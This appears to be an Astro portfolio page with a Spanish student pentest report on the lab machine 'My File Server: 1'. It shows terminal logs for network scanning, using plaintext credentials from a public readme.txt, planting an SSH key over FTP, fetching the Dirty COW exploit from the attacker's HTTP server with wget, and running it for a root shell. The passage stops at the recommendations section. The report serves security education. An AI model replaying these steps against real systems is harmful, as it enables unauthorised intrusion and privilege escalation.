@@ -1,0 +1,691 @@
+---
+import Layout from "../../layouts/Layout.astro"
+import SectionContainer from "../../components/SectionContainer.astro"
+import TitleSection from "../../components/TitleSection.astro"
+import CodeIcon from "../../components/Icons/Code.astro"
+import Link from "../../components/Icons/Link.astro"
+
+const INFO_TAREA = {
+  titulo: "Actividad 9: Red Team Report — Pentesting de My File Server 1",
+  fecha: "09 de Marzo, 2026",
+  descripcion: "Evaluación de seguridad ofensiva (Penetration Test) sobre la máquina vulnerable My File Server: 1, disponible en la plataforma Armour Infosec. Se identificaron siete vulnerabilidades de impacto significativo, logrando compromiso total del sistema mediante escalada de privilegios con Dirty COW (CVE-2016-5195).",
+  pdf: "/pdfs/actividad09-Equipo5.pdf",
+  imagen: "/projects/Imagen2Tarea9.png"
+}
+---
+
+<Layout
+  title={`Portafolio - ${INFO_TAREA.titulo}`}
+  description={INFO_TAREA.descripcion}
+>
+  <style>
+    :global(header) {
+      display: none !important;
+    }
+  </style>
+
+  <main class="px-4">
+    <SectionContainer class="py-16 md:py-20">
+
+      {/* --- ENCABEZADO --- */}
+      <TitleSection>
+        <CodeIcon class="size-8" />
+        {INFO_TAREA.titulo}
+      </TitleSection>
+
+      <p class="text-sm text-gray-500 dark:text-gray-400 mb-8 -mt-4 border-b border-gray-200 dark:border-gray-800 pb-4">
+        📅 Entregado el: {INFO_TAREA.fecha}
+      </p>
+
+      {/* Badge riesgo global */}
+      <div class="mb-10 flex items-center gap-3">
+        <span class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-red-600/10 border border-red-500/30 text-red-500 text-sm font-bold tracking-wide">
+          ⚠ RIESGO GLOBAL: CRÍTICO
+        </span>
+        <span class="text-gray-500 dark:text-gray-400 text-sm">7 vulnerabilidades · Acceso root obtenido</span>
+      </div>
+
+      <div class="prose dark:prose-invert max-w-none text-gray-800 dark:text-gray-200 space-y-12">
+
+        {/* ── 1. EXECUTIVE SUMMARY ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">1. Executive Summary</h3>
+          <p>
+            Se realizó una evaluación de seguridad ofensiva (Penetration Test) sobre la máquina vulnerable
+            <strong> My File Server: 1</strong>, disponible en la plataforma Armour Infosec, con dirección IP
+            <code class="text-yellow-400 bg-gray-900 px-1 rounded">192.168.0.8</code>. La evaluación se llevó a cabo bajo
+            una metodología estructurada, siguiendo las fases de reconocimiento, enumeración, explotación y
+            post-explotación, con el objetivo de identificar, documentar y demostrar el nivel de exposición real del sistema.
+          </p>
+          <p class="mt-3">
+            Durante la evaluación se identificaron <strong>siete (7) vulnerabilidades</strong> de impacto significativo.
+            Entre los hallazgos más críticos se encontró la exposición de credenciales en texto plano dentro de un archivo
+            accesible públicamente (<code class="text-yellow-400 bg-gray-900 px-1 rounded">readme.txt</code>), lo que
+            permitió el acceso autenticado al servicio FTP (puerto 21, vsftpd 3.0.2) y posteriormente la inyección de una
+            llave pública SSH en el directorio home del usuario <code class="text-yellow-400 bg-gray-900 px-1 rounded">smbuser</code>.
+          </p>
+          <p class="mt-3">
+            Una vez obtenido acceso al sistema como usuario no privilegiado, se detectó que el kernel en ejecución
+            correspondía a la versión <code class="text-yellow-400 bg-gray-900 px-1 rounded">3.10.0-229.el7.x86_64</code>,
+            afectada por la vulnerabilidad <strong>Dirty COW (CVE-2016-5195)</strong>. La explotación de dicha
+            vulnerabilidad permitió la escalada de privilegios al usuario root, logrando el <strong>compromiso total del
+            sistema objetivo</strong>.
+          </p>
+          <div class="mt-4 p-4 rounded-lg bg-red-900/20 border border-red-500/30 text-red-400 text-sm font-semibold">
+            El nivel de riesgo general del sistema se clasifica como CRÍTICO. Se recomienda atender de manera inmediata
+            las observaciones documentadas en la sección de recomendaciones técnicas.
+          </div>
+        </div>
+
+        {/* ── 2. ALCANCE ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">2. Alcance (Scope)</h3>
+          <p>La evaluación se limitó exclusivamente al activo descrito a continuación, dentro de un entorno de laboratorio controlado:</p>
+          <div class="mt-4 overflow-x-auto rounded-lg border border-gray-700">
+            <table class="w-full text-sm">
+              <tbody>
+                {[
+                  ["Nombre del objetivo", "My File Server: 1"],
+                  ["Dirección IP", "192.168.0.8"],
+                  ["Sistema Operativo", "CentOS Linux 3.10.0-229.el7.x86_64"],
+                  ["Segmento de red", "192.168.0.0/24"],
+                  ["Tipo de evaluación", "Caja Negra (Black Box) — sin credenciales previas"],
+                  ["Ambiente", "Entorno simulado / red interna de laboratorio"],
+                  ["Periodo", "08–09 de marzo de 2026"],
+                ].map(([label, value]) => (
+                  <tr class="border-b border-gray-700/50 last:border-0">
+                    <td class="px-4 py-2.5 font-semibold text-gray-400 bg-gray-900/40 w-48">{label}</td>
+                    <td class="px-4 py-2.5 text-gray-200 font-mono text-xs">{value}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        {/* ── 3. METODOLOGÍA ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">3. Metodología Aplicada</h3>
+          <p>
+            La evaluación se llevó a cabo conforme al estándar <strong>PTES (Penetration Testing Execution Standard)</strong>.
+            Las fases ejecutadas fueron:
+          </p>
+          <div class="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
+            {[
+              ["01", "Reconocimiento", "Recopilación de información pasiva y activa: escaneo de red, identificación de hosts activos y descubrimiento de servicios."],
+              ["02", "Enumeración", "Identificación detallada de versiones de servicios, configuraciones expuestas, recursos compartidos y vectores de ataque."],
+              ["03", "Explotación", "Aprovechamiento de las vulnerabilidades identificadas para obtener acceso no autorizado al sistema objetivo."],
+              ["04", "Post-Explotación", "Escalada de privilegios, mantenimiento de acceso e identificación de datos sensibles tras el acceso inicial."],
+              ["05", "Elaboración de informe", "Documentación técnica y ejecutiva de hallazgos, evidencias, análisis de impacto y recomendaciones de remediación."],
+            ].map(([num, fase, desc]) => (
+              <div class="flex gap-3 p-3 rounded-lg bg-gray-900/40 border border-gray-700/50">
+                <span class="text-blue-400 font-bold font-mono text-lg shrink-0">{num}</span>
+                <div>
+                  <p class="font-semibold text-gray-200 text-sm">{fase}</p>
+                  <p class="text-gray-400 text-xs mt-0.5">{desc}</p>
+                </div>
+              </div>
+            ))}
+          </div>
+          <p class="mt-4 text-sm text-gray-500 dark:text-gray-400">
+            <strong class="text-gray-300">Herramientas utilizadas:</strong> netdiscover · Nmap · smbmap · Nikto · Metasploit Framework · cliente FTP · ssh-keygen · wget · gcc · exploit CVE-2016-5195 (40616.c)
+          </p>
+        </div>
+
+        {/* ── 4. RECONOCIMIENTO ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">4. Fase de Reconocimiento</h3>
+          <p>
+            Se realizó un escaneo activo de la red para identificar los hosts disponibles dentro del segmento
+            <code class="text-yellow-400 bg-gray-900 px-1 rounded">192.168.0.0/16</code> mediante la herramienta
+            <strong>netdiscover</strong>, la cual envía solicitudes ARP y analiza las respuestas para descubrir
+            dispositivos activos en la red local.
+          </p>
+
+          <h4 class="text-base font-semibold mt-5 mb-2 text-gray-300">4.1 Descubrimiento de hosts (ARP Scan — netdiscover)</h4>
+          <p class="text-sm text-gray-400 mb-3">
+            Se capturaron 19 paquetes ARP provenientes de 8 hosts activos. El host objetivo con IP
+            <code class="text-yellow-400 bg-gray-900 px-1 rounded">192.168.0.8</code> fue identificado con proveedor MAC
+            PCS Systemtechnik GmbH (VirtualBox), confirmando el entorno virtualizado.
+          </p>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — netdiscover</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">root@kali:~#</span> netdiscover -r 192.168.0.0/16
+
+ Currently scanning: 192.168.0.0/16  |  Screen View: Unique Hosts
+ 19 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 1140
+
+   IP              At MAC Address     Count  Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------
+ 192.168.0.1      48:4e:fc:fc:f3:f6    1     60   Commscope
+ 192.168.0.3      ac:2e:98:0b:61:85    6    360   AzureWave Technology Inc.
+<span class="text-yellow-300"> 192.168.0.8      08:00:27:e4:01:f0    1     60   PCS Systemtechnik GmbH</span>
+ 192.168.0.7      68:72:c3:11:d6:a2    1     60   Samsung Electronics Co.,Ltd
+ 192.168.0.4      9e:8a:42:a1:32:64    1     60   Unknown vendor
+ 192.168.0.2      ee:ce:85:85:b7:99    7    420   Unknown vendor
+ 192.168.0.6      bc:98:df:d3:97:ff    1     60   Motorola Mobility LLC
+ 192.168.0.253    00:00:ca:01:02:03    1     60   Commscope</pre>
+            </div>
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">4.2 Escaneo de puertos y servicios (Nmap -sV)</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — nmap</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">┌──(kali㉿kali)-[~]</span>
+<span class="text-green-400">└─$</span> nmap -p- 192.168.0.8 -sV
+
+Starting Nmap 7.95 at 2026-03-08 15:59 EDT
+Nmap scan report for 192.168.0.8
+Host is up (0.000265s latency).
+
+PORT      STATE SERVICE    VERSION
+<span class="text-yellow-300">21/tcp    open  ftp        vsftpd 3.0.2</span>
+<span class="text-yellow-300">22/tcp    open  ssh        OpenSSH 7.4 (protocol 2.0)</span>
+<span class="text-yellow-300">80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))</span>
+<span class="text-yellow-300">111/tcp   open  rpcbind    2-4 (RPC #100000)</span>
+<span class="text-yellow-300">445/tcp   open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: SAMBA)</span>
+<span class="text-yellow-300">2049/tcp  open  nfs_acl    3 (RPC #100227)</span>
+<span class="text-yellow-300">2121/tcp  open  ftp        ProFTPD 1.3.5</span>
+20048/tcp open  mountd     1-3 (RPC #100005)
+MAC Address: 08:00:27:e4:01:f0 (PCS Systemtechnik/Oracle VirtualBox)
+Service Info: Host: FILESERVER; OS: Unix</pre>
+            </div>
+          </div>
+        </div>
+
+        {/* ── 5. ENUMERACIÓN ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">5. Enumeración</h3>
+          <p>
+            Durante la fase de enumeración se profundizó en el análisis de cada servicio identificado, con el objetivo
+            de detectar configuraciones inseguras, versiones vulnerables y recursos accesibles sin autenticación.
+          </p>
+
+          <h4 class="text-base font-semibold mt-5 mb-2 text-gray-300">5.1 Escaneo detallado con Nmap -A</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — nmap -A</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">└─$</span> nmap -A 192.168.0.8
+
+21/tcp open ftp  vsftpd 3.0.2
+| ftp-anon: <span class="text-red-400">Anonymous FTP login allowed (FTP code 230)</span>
+|_drwxrwxrwx  3  0  0  16 Feb 19 2020 pub [NSE: writeable]
+| ftp-syst:
+|   STAT: vsFTPd 3.0.2 - secure, fast, stable
+
+80/tcp open http Apache httpd 2.4.6 ((CentOS))
+| http-methods:
+|_  <span class="text-red-400">Potentially risky methods: TRACE</span>
+|_http-title: My File Server
+|_http-server-header: Apache/2.4.6 (CentOS)
+
+445/tcp open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|   message_signing: disabled (but not default)</pre>
+            </div>
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-3 text-gray-300">5.2 Detalle de servicios identificados</h4>
+          <div class="space-y-3">
+            {[
+              { puerto: "21/tcp", servicio: "FTP — vsftpd 3.0.2", color: "red", desc: "Acceso FTP anónimo habilitado con directorio raíz en modo escritura. Permite a cualquier usuario no autenticado leer y escribir archivos en el servidor. Riesgo ALTO." },
+              { puerto: "22/tcp", servicio: "SSH — OpenSSH 7.4", color: "blue", desc: "Servicio SSH con llaves públicas expuestas (RSA, ECDSA y ED25519). Posteriormente utilizado como vector de acceso remoto al sistema." },
+              { puerto: "80/tcp", servicio: "HTTP — Apache httpd 2.4.6 (CentOS)", color: "orange", desc: "Servidor web con método HTTP TRACE habilitado (susceptible a XST), directorio indexing activo y cabecera X-Frame-Options ausente (Clickjacking)." },
+              { puerto: "111/tcp", servicio: "RPC/NFS — rpcbind 2-4", color: "gray", desc: "Servicio rpcbind con NFS en puerto 2049. El servidor podría contar con sistemas de archivos exportados accesibles desde la red si no están restringidos." },
+              { puerto: "445/tcp", servicio: "SMB/Samba — smbd 4.9.1", color: "yellow", desc: "Samba respondía a sesiones nulas (NULL session), permitiendo enumeración de recursos compartidos sin credenciales válidas." },
+              { puerto: "2121/tcp", servicio: "FTP secundario — ProFTPD 1.3.5", color: "purple", desc: "Segundo servidor FTP en puerto no estándar. ProFTPD 1.3.5 contiene vulnerabilidades históricas documentadas. Incrementa la superficie de ataque." },
+            ].map(({ puerto, servicio, desc }) => (
+              <div class="flex gap-3 p-3 rounded-lg bg-gray-900/40 border border-gray-700/50">
+                <code class="text-yellow-400 font-mono text-xs shrink-0 mt-0.5">{puerto}</code>
+                <div>
+                  <p class="font-semibold text-gray-200 text-sm">{servicio}</p>
+                  <p class="text-gray-400 text-xs mt-0.5">{desc}</p>
+                </div>
+              </div>
+            ))}
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">5.3 Enumeración SMB — smbmap</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — smbmap</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">└─$</span> smbmap -H 192.168.0.8
+
+[+] IP: 192.168.0.8:445  Name: 192.168.0.8    Status: NULL Session
+        Disk                    Permissions     Comment
+        ----                    -----------     -------
+        print$                  NO ACCESS       Printer Drivers
+<span class="text-red-400">        smbdata                 READ, WRITE     smbdata</span>
+        smbuser                 NO ACCESS       smbuser
+        IPC$                    NO ACCESS       IPC Service (Samba 4.9.1)</pre>
+            </div>
+          </div>
+          <p class="text-sm text-gray-400 mt-2">
+            El recurso compartido <code class="text-yellow-400 bg-gray-900 px-1 rounded">smbdata</code> contaba con
+            permisos READ/WRITE accesibles sin autenticación. Esta configuración representa un riesgo significativo
+            de exfiltración y manipulación de datos.
+          </p>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">5.4 Análisis HTTP — Nikto</h4>
+          <p class="text-sm text-gray-400 mb-3">El escaneo con Nikto sobre el puerto 80 identificó:</p>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — nikto</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">└─$</span> nikto -h 192.168.0.8
+
++ Target IP:          192.168.0.8
++ Target Hostname:    192.168.0.8
++ Target Port:        80
+
+<span class="text-red-400">+ The anti-clickjacking X-Frame-Options header is not present.</span>
+<span class="text-red-400">+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.2.34).</span>
+<span class="text-red-400">+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE.</span>
+<span class="text-red-400">+ HTTP TRACE method is active which suggests the host is vulnerable to XST.</span>
+<span class="text-red-400">+ /icons/README: Directory indexing found.</span>
+<span class="text-yellow-300">+ /readme.txt: This might be interesting.</span>
++ 1 host(s) tested</pre>
+            </div>
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">5.5 Descubrimiento de credenciales expuestas — readme.txt</h4>
+          <p class="text-sm text-gray-400 mb-3">
+            A partir de la detección del archivo <code class="text-yellow-400 bg-gray-900 px-1 rounded">readme.txt</code> por
+            Nikto, se accedió al recurso mediante navegador apuntando a
+            <code class="text-yellow-400 bg-gray-900 px-1 rounded">http://192.168.0.8/readme.txt</code>. El archivo
+            contenía las credenciales del sistema en texto plano, sin ningún tipo de ofuscación o cifrado.
+          </p>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">http://192.168.0.8/readme.txt</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+My Password is
+<span class="text-red-400 font-bold">rootroot1</span></pre>
+            </div>
+          </div>
+          <div class="mt-3 p-3 rounded-lg bg-red-900/20 border border-red-500/30 text-red-400 text-sm">
+            <strong>Vulnerabilidad CRÍTICA:</strong> La contraseña <code class="bg-gray-900 px-1 rounded">rootroot1</code>
+            del usuario <code class="bg-gray-900 px-1 rounded">smbuser</code> estaba expuesta en un recurso web público.
+            Esto permitió acceso autenticado sin necesidad de fuerza bruta ni técnicas avanzadas.
+          </div>
+        </div>
+
+        {/* ── 6. EXPLOTACIÓN ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">6. Explotación</h3>
+          <p>
+            Con las credenciales obtenidas del archivo <code class="text-yellow-400 bg-gray-900 px-1 rounded">readme.txt</code>,
+            se procedió a la fase de explotación. El vector de acceso inicial se estableció aprovechando las credenciales
+            en combinación con las capacidades de escritura del servicio FTP, inyectando una llave pública SSH para
+            obtener acceso remoto persistente.
+          </p>
+
+          <h4 class="text-base font-semibold mt-5 mb-2 text-gray-300">6.1 Generación de llave pública SSH</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — ssh-keygen</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">└─$</span> sudo ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/root/.ssh/id_ed25519):
+Your identification has been saved in /root/.ssh/id_ed25519
+Your public key has been saved in /root/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:DXq7H4Z6TjTObJm3MH5vhNsmst60AlFEK8B+ud3/vZk root@kali
++--[ED25519 256]---+</pre>
+            </div>
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">6.2 Acceso FTP autenticado y carga de llave SSH</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — ftp + SSH key injection</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">root@kali:/</span> ftp 192.168.0.8
+Connected to 192.168.0.8.
+220 (vsFTPd 3.0.2)
+Name (192.168.0.8:kali): <span class="text-yellow-300">smbuser</span>
+331 Please specify the password.
+Password: <span class="text-yellow-300">rootroot1</span>
+<span class="text-green-400">230 Login successful.</span>
+Remote system type is UNIX.
+
+ftp> pwd
+Remote directory: /home/smbuser
+ftp> mkdir .ssh
+550 Create directory operation failed.
+ftp> cd .ssh
+250 Directory successfully changed.
+ftp> put /root/.ssh/id_ed25519.pub authorized_keys
+local: /root/.ssh/id_ed25519.pub remote: authorized_keys
+229 Entering Extended Passive Mode (|||5360|).
+150 Ok to send data.
+<span class="text-green-400">226 Transfer complete.</span>
+<span class="text-green-400">91 bytes sent in 00:00 (91.99 KiB/s)</span>
+ftp> exit
+221 Goodbye.</pre>
+            </div>
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">6.3 Acceso SSH sin contraseña al servidor objetivo</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — ssh</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">root@kali:/</span> ssh smbuser@192.168.0.8
+Warning: Permanently added '192.168.0.8' (ED25519) to the list of known hosts.
+
+  ################################################################
+  #                        Armour Infosec                        #
+  #              -------- www.armourinfosec.com --------         #
+  #                      My File Server - 1                      #
+  ################################################################
+
+Last login: Thu Feb 20 16:42:21 2020
+<span class="text-green-400">[smbuser@fileserver ~]$</span> uname -a
+<span class="text-yellow-300">Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64</span></pre>
+            </div>
+          </div>
+          <p class="text-sm text-gray-400 mt-2">
+            Acceso interactivo obtenido como <code class="text-yellow-400 bg-gray-900 px-1 rounded">smbuser</code>.
+            La versión del kernel <code class="text-yellow-400 bg-gray-900 px-1 rounded">3.10.0-229.el7.x86_64</code>
+            es vulnerable a Dirty COW (CVE-2016-5195).
+          </p>
+        </div>
+
+        {/* ── 7. ESCALADA DE PRIVILEGIOS ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">7. Escalada de Privilegios — Dirty COW (CVE-2016-5195)</h3>
+          <p>
+            La versión del kernel identificada (<code class="text-yellow-400 bg-gray-900 px-1 rounded">3.10.0-229.el7.x86_64</code>)
+            presentaba la vulnerabilidad crítica <strong>Dirty COW</strong>, que permite a un usuario no privilegiado
+            escribir en archivos de solo lectura mediante una condición de carrera en el mecanismo copy-on-write del
+            kernel de Linux.
+          </p>
+
+          <h4 class="text-base font-semibold mt-5 mb-2 text-gray-300">7.1 Transferencia del exploit al servidor objetivo</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — python3 HTTP server + wget</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-gray-400"># En Kali Linux (atacante) — levantar servidor HTTP</span>
+<span class="text-green-400">└─$</span> cd ~/Desktop && python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+<span class="text-gray-400">192.168.0.8 - [08/Mar/2026 16:33:03] "GET /40616.c HTTP/1.1" 200 -</span>
+
+<span class="text-gray-400"># En el servidor objetivo (smbuser)</span>
+<span class="text-green-400">[smbuser@fileserver ~]$</span> wget http://192.168.0.10:8080/40616.c
+--2026-03-09 02:03:01--  http://192.168.0.10:8080/40616.c
+Connecting to 192.168.0.10:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4963 (4.8K) [text/x-csrc]
+<span class="text-green-400">'40616.c' saved [4963/4963]</span></pre>
+            </div>
+          </div>
+
+          <h4 class="text-base font-semibold mt-6 mb-2 text-gray-300">7.2 Compilación y ejecución del exploit</h4>
+          <div class="relative bg-[#1e1e1e] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">terminal — gcc + Dirty COW</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-green-400">[smbuser@fileserver ~]$</span> gcc 40616.c -o pa -pthread
+<span class="text-gray-400">40616.c: In function 'procselfmemThread':</span>
+<span class="text-gray-400">40616.c:99:9: warning: passing argument 2 of 'lseek'...</span>
+
+<span class="text-green-400">[smbuser@fileserver ~]$</span> ./pa
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 27832
+Racing, this may take a while..
+thread stopped
+thread stopped
+<span class="text-yellow-300">/usr/bin/passwd is overwritten</span>
+Popping root shell.
+Don't forget to restore /tmp/bak
+
+<span class="text-red-400 font-bold">[root@fileserver smbuser]# whoami
+root</span></pre>
+            </div>
+          </div>
+          <div class="mt-3 p-3 rounded-lg bg-red-900/20 border border-red-500/30 text-red-400 text-sm font-semibold">
+            ✓ Compromiso total del sistema confirmado. Escalada de privilegios exitosa:
+            <code class="bg-gray-900 px-1 rounded">smbuser</code> → <code class="bg-gray-900 px-1 rounded">root</code>
+          </div>
+        </div>
+
+        {/* ── 8. ANÁLISIS CIA ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">8. Análisis de Impacto — Modelo CIA</h3>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
+            {[
+              {
+                letra: "C",
+                nombre: "Confidencialidad",
+                nivel: "CRÍTICO",
+                color: "red",
+                desc: "Credenciales expuestas en texto plano en recurso web público. Con acceso root se pudo leer /etc/shadow, datos de usuarios, archivos SMB y toda la información almacenada en el servidor."
+              },
+              {
+                letra: "I",
+                nombre: "Integridad",
+                nivel: "CRÍTICO",
+                color: "red",
+                desc: "Acceso root permite modificar cualquier archivo del sistema. Dirty COW sobreescribió /usr/bin/passwd como demostración. El recurso smbdata (READ/WRITE sin auth) también está en riesgo de manipulación."
+              },
+              {
+                letra: "A",
+                nombre: "Disponibilidad",
+                nivel: "ALTO",
+                color: "orange",
+                desc: "Con acceso root un atacante podría detener servicios, eliminar archivos críticos, instalar rootkits/backdoors o apagar el servidor. No se realizaron acciones destructivas durante la evaluación."
+              }
+            ].map(({ letra, nombre, nivel, color, desc }) => (
+              <div class={`p-4 rounded-lg border ${color === 'red' ? 'border-red-500/30 bg-red-900/10' : 'border-orange-500/30 bg-orange-900/10'}`}>
+                <div class="flex items-center gap-2 mb-2">
+                  <span class={`text-2xl font-black ${color === 'red' ? 'text-red-400' : 'text-orange-400'}`}>{letra}</span>
+                  <div>
+                    <p class="font-semibold text-gray-200 text-sm">{nombre}</p>
+                    <span class={`text-xs font-bold ${color === 'red' ? 'text-red-400' : 'text-orange-400'}`}>{nivel}</span>
+                  </div>
+                </div>
+                <p class="text-gray-400 text-xs">{desc}</p>
+              </div>
+            ))}
+          </div>
+        </div>
+
+        {/* ── 9. RECOMENDACIONES ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">9. Recomendaciones Técnicas</h3>
+          <p class="text-sm text-gray-400 mb-4">
+            Ordenadas por prioridad de remediación. Se recomienda abordar de manera inmediata los hallazgos CRÍTICOS y ALTOS.
